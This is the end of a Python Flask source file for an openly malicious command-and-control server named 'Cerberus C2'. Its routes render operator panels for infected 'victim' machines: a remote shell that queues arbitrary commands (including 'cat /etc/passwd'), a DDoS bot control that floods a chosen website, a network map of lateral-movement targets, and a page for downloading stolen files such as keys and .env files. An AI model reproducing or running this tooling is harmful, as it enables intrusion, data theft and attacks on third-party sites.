            <h1>🎮 Remote Shell — {vid[:12]}...<span class="refresh-indicator" id="refresh-dot"></span></h1>
            <div><a href="/">← Dashboard</a><a href="/victim/{vid}">Victim Details</a><a href="/network_map/{vid}">🗺️ Network</a><a href="/exfil/{vid}">📁 Files</a></div>
        </div>
        
        <div class="content">
            <div class="panel" style="grid-column: 1 / -1;">
                <h2>💀 Remote Command Execution (Poltergeist)</h2>
                <form class="cmd-form" action="/rat_panel/{vid}/exec" method="POST">
                    <input type="text" name="cmd" id="cmd-input" placeholder="Enter shell command... (e.g. ls /home or cat /etc/passwd)" autocomplete="off" required>
                    <button type="submit">Execute ▶</button>
                </form>
                <div class="quick-btns">
                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="whoami"><button type="submit" class="quick-btn">whoami</button></form>
                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="id"><button type="submit" class="quick-btn">id</button></form>
                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="uname -a"><button type="submit" class="quick-btn">uname -a</button></form>
                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="ps aux"><button type="submit" class="quick-btn">ps aux</button></form>
                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="ls -la /home"><button type="submit" class="quick-btn">ls /home</button></form>
                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="ifconfig"><button type="submit" class="quick-btn">ifconfig</button></form>
                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="netstat -tlnp"><button type="submit" class="quick-btn">netstat</button></form>
                    <form action="/rat_panel/{vid}/exec" method="POST" style="display:inline;"><input type="hidden" name="cmd" value="cat /etc/passwd"><button type="submit" class="quick-btn">cat /etc/passwd</button></form>
                </div>
                <div class="terminal" id="terminal-output">{output_html}</div>
            </div>
            
            <div class="panel">
                <h2>🧟 DDoS Bot (Zombie)</h2>
                <div class="ddos-status">
                    <span class="dot {'dot-red' if ddos_active else 'dot-green'}"></span>
                    <span style="font-weight: 600;">{'🔴 ATTACKING' if ddos_active else '🟢 IDLE'}</span>
                    {'<span style="color: #8b949e; margin-left: 10px;">Target: ' + ddos_target + '</span>' if ddos_target else ''}
                </div>
                <form class="ddos-form" action="/rat_panel/{vid}/ddos" method="POST">
                    <input type="text" name="target" placeholder="http://target-website.com" value="{ddos_target}" required>
                    <button type="submit" name="action" value="start" class="btn-attack">⚡ Attack</button>
                    <button type="submit" name="action" value="stop" class="btn-stop">🛑 Stop</button>
                </form>
                <p style="color: #484f58; font-size: 11px; margin-top: 8px;">Spawns 5 threads flooding the target with HTTP requests.</p>
            </div>
            
            <div class="panel">
                <h2>ℹ️ About This Panel</h2>
                <p style="color: #8b949e; font-size: 13px; line-height: 1.6;">
                    <b>Remote Shell</b> — Execute any command on the victim's machine. Use <code style="color: #79c0ff;">cd /path && ls</code> to navigate + list, since each command runs in its own shell. Example: <code style="color: #79c0ff;">cd /home/user && ls -la</code><br><br>
                    <b>DDoS Bot</b> — Turns the victim machine into a bot that floods a target website with requests. Use Start/Stop to control.
                </p>
            </div>
        </div>
        
        <script>
            // AJAX auto-refresh: Only updates the terminal output, NOT the input field
            setInterval(function() {{
                var dot = document.getElementById('refresh-dot');
                dot.textContent = ' ⟳';
                fetch(window.location.href)
                    .then(r => r.text())
                    .then(html => {{
                        var parser = new DOMParser();
                        var doc = parser.parseFromString(html, 'text/html');
                        var newTerminal = doc.getElementById('terminal-output');
                        if (newTerminal) {{
                            document.getElementById('terminal-output').innerHTML = newTerminal.innerHTML;
                        }}
                        dot.textContent = '';
                    }})
                    .catch(function() {{ dot.textContent = ''; }});
            }}, 5000);
            
            // Keep focus on input after page load
            document.getElementById('cmd-input').focus();
        </script>
    </body>
    </html>
    """
    return html

@app.route('/rat_panel/<vid>/exec', methods=['POST'])
def rat_exec(vid):
    cmd = request.form.get('cmd')
    if vid not in rat_commands:
        rat_commands[vid] = []
    rat_commands[vid].append({"type": "shell", "cmd": cmd})
    return redirect(url_for('rat_panel', vid=vid))

@app.route('/rat_panel/<vid>/ddos', methods=['POST'])
def rat_ddos_control(vid):
    action = request.form.get('action')
    target = request.form.get('target')
    if vid not in rat_commands:
        rat_commands[vid] = []
    if action == 'start':
        rat_commands[vid].append({"type": "ddos_start", "target": target})
        ddos_state[vid] = {"active": True, "target": target}
    elif action == 'stop':
        rat_commands[vid].append({"type": "ddos_stop"})
        if vid in ddos_state:
            ddos_state[vid]['active'] = False
    return redirect(url_for('rat_panel', vid=vid))

# Network Map UI
@app.route('/network_map/<vid>')
def show_network_map(vid):
    hosts = network_maps.get(vid, [])
    
    # Port name lookup
    port_names = {22: 'SSH', 80: 'HTTP', 443: 'HTTPS', 445: 'SMB', 3389: 'RDP'}
    
    host_rows = ""
    for host in hosts:
        ports = host.get('ports', [])
        port_badges = ""
        for p in ports:
            name = port_names.get(p, str(p))
            port_badges += f'<span style="background: #21262d; padding: 2px 8px; border-radius: 4px; font-size: 12px; margin: 2px;">{p} ({name})</span> '
        host_rows += f'<tr><td style="color: #58a6ff; font-family: monospace;">{host.get("ip", "N/A")}</td><td>{port_badges}</td><td><span style="color: #3fb950;">● LIVE</span></td></tr>'
    
    if not hosts:
        host_rows = '<tr><td colspan="3" style="text-align: center; color: #484f58; padding: 30px;">No hosts discovered. The victim\'s network may not have responded or scan is still running.</td></tr>'
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Network Map — {vid}</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ background: #0f1117; color: #c9d1d9; font-family: 'Segoe UI', -apple-system, sans-serif; }}
            .topbar {{ background: #161b22; padding: 12px 25px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #21262d; }}
            .topbar h1 {{ color: #26a699; font-size: 18px; }}
            .topbar a {{ color: #58a6ff; text-decoration: none; margin-left: 15px; font-size: 13px; }}
            .content {{ padding: 20px 25px; }}
            .info {{ background: #161b22; border: 1px solid #21262d; border-radius: 8px; padding: 15px 20px; margin-bottom: 15px; }}
            .info p {{ color: #8b949e; font-size: 13px; line-height: 1.6; }}
            table {{ width: 100%; border-collapse: collapse; background: #161b22; border: 1px solid #21262d; border-radius: 8px; overflow: hidden; }}
            th {{ background: #21262d; color: #c9d1d9; padding: 12px 15px; text-align: left; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }}
            td {{ padding: 12px 15px; border-top: 1px solid #21262d; }}
            tr:hover {{ background: #1c2128; }}
            .legend {{ display: flex; gap: 15px; margin-top: 15px; }}
            .legend span {{ color: #8b949e; font-size: 12px; }}
        </style>
    </head>
    <body>
        <div class="topbar">
            <h1>🗺️ Network Map — {vid[:12]}...</h1>
            <div><a href="/">← Dashboard</a><a href="/rat_panel/{vid}">🎮 Remote Shell</a><a href="/exfil/{vid}">📁 Files</a></div>
        </div>
        <div class="content">
            <div class="info">
                <p><b>What is this?</b> The Cartographer module scanned the victim's local network (same WiFi/LAN) to find other devices. These are potential lateral movement targets — other computers, servers, or IoT devices on the same network that could also be compromised.</p>
                <p style="margin-top: 8px;"><b>Found {len(hosts)} device(s)</b> on the victim's network.</p>
            </div>
            <table>
                <thead><tr><th>IP Address</th><th>Open Ports (Services)</th><th>Status</th></tr></thead>
                <tbody>{host_rows}</tbody>
            </table>
            <div class="legend">
                <span>SSH (22) = Remote Login</span>
                <span>HTTP (80) = Web Server</span>
                <span>HTTPS (443) = Secure Web</span>
                <span>SMB (445) = File Sharing</span>
                <span>RDP (3389) = Remote Desktop</span>
            </div>
        </div>
    </body>
    </html>
    """
    return html

# Exfiltration Data UI
@app.route('/exfil/<vid>')
def show_exfil(vid):
    files = exfil_store.get(vid, [])
    
    # File type icons
    ext_icons = {'.txt': '📄', '.pdf': '📕', '.doc': '📝', '.docx': '📝', '.xls': '📊', '.xlsx': '📊',
                 '.csv': '📊', '.jpg': '🖼️', '.png': '🖼️', '.jpeg': '🖼️', '.json': '⚙️', '.xml': '⚙️',
                 '.pem': '🔑', '.key': '🔑', '.env': '🔐', '.sql': '🗃️', '.db': '🗃️'}
    
    file_rows = ""
    for idx, f in enumerate(files):
        ext = os.path.splitext(f.get('name', ''))[1].lower()
        icon = ext_icons.get(ext, '📎')
        size_kb = f.get('size', 0) / 1024
        file_rows += f"""
        <tr>
            <td>{icon} <b>{f.get('name', 'N/A')}</b></td>
            <td style="color: #8b949e; font-size: 12px;">{f.get('path', 'N/A')}</td>
            <td>{size_kb:.1f} KB</td>
            <td><a href="/api/exfil/{vid}/download/{idx}" style="background: #238636; color: white; padding: 5px 12px; border-radius: 5px; text-decoration: none; font-size: 12px; font-weight: 600;">⬇️ Download</a></td>
        </tr>"""
    
    if not files:
        file_rows = '<tr><td colspan="4" style="text-align: center; color: #484f58; padding: 30px;">No files exfiltrated yet. The Data Thief module scans for documents, credentials, and config files on the victim machine.</td></tr>'
    
    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Stolen Files — {vid}</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; }}
            body {{ background: #0f1117; color: #c9d1d9; font-family: 'Segoe UI', -apple-system, sans-serif; }}
            .topbar {{ background: #161b22; padding: 12px 25px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #21262d; }}
            .topbar h1 {{ color: #db6d28; font-size: 18px; }}
            .topbar a {{ color: #58a6ff; text-decoration: none; margin-left: 15px; font-size: 13px; }}
            .content {{ padding: 20px 25px; }}
            .stat {{ background: #161b22; border: 1px solid #21262d; border-radius: 8px; padding: 15px 20px; margin-bottom: 15px; display: flex; gap: 30px; }}
            .stat div {{ text-align: center; }}
            .stat .num {{ font-size: 24px; font-weight: bold; color: #db6d28; }}
            .stat .lbl {{ color: #8b949e; font-size: 12px; }}
            table {{ width: 100%; border-collapse: collapse; background: #161b22; border: 1px solid #21262d; border-radius: 8px; overflow: hidden; }}
            th {{ background: #21262d; color: #c9d1d9; padding: 12px 15px; text-align: left; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }}
            td {{ padding: 10px 15px; border-top: 1px solid #21262d; }}
            tr:hover {{ background: #1c2128; }}
        </style>
    </head>
    <body>
        <div class="topbar">
            <h1>📁 Stolen Files — {vid[:12]}...</h1>
            <div><a href="/">← Dashboard</a><a href="/rat_panel/{vid}">🎮 Remote Shell</a><a href="/network_map/{vid}">🗺️ Network</a></div>
        </div>
        <div class="content">
            <div class="stat">
                <div><div class="num">{len(files)}</div><div class="lbl">Files Stolen</div></div>
                <div><div class="num">{sum(f.get('size', 0) for f in files) / 1024:.1f} KB</div><div class="lbl">Total Size</div></div>
            </div>
            <table>
                <thead><tr><th>File Name</th><th>Original Path</th><th>Size</th><th>Action</th></tr></thead>
                <tbody>{file_rows}</tbody>
            </table>
        </div>
    </body>
    </html>
    """
    return html

if __name__ == '__main__':
    print("\n" + "="*50)
    print("         Cerberus C2 Server Online")
    print("="*50)
    print(f"-> Public Key:\n{ATTACKER_PUBLIC_KEY}")
    print(f"-> Dashboard: http://{C2_HOST}:{C2_PORT}")
    print("="*50 + "\n")
    app.run(host=C2_HOST, port=C2_PORT)
